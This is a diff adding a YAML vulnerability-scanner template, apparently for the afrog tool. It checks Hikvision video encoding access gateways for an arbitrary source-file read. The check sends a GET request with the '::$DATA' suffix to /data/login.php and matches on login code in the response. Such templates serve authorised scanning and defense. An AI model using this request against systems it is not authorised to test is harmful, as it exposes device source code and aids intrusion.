@@ -1,0 +1,19 @@
+id: hikvision-gateway-data-fileread
+
+info:
+  name: HIKVISION 视频编码设备接入网关 $DATA 任意文件读取
+  author: zan8in
+  severity: high
+  description: |
+    HIKVISION 视频编码设备接入网关存在配置错误特性，特殊后缀请求php文件可读取源码
+    title="视频编码设备接入网关"
+  tags: cve,cve2023,fileread,hikvision
+  created: 2023/05/26
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /data/login.php::$DATA
+    expression: response.status == 200 && response.body.bcontains(b'DataBaseQuery();') && response.body.bcontains(b'$_POST[\'userName\'];') && response.body.bcontains(b'$_POST[\'password\'];')
+expression: r0()
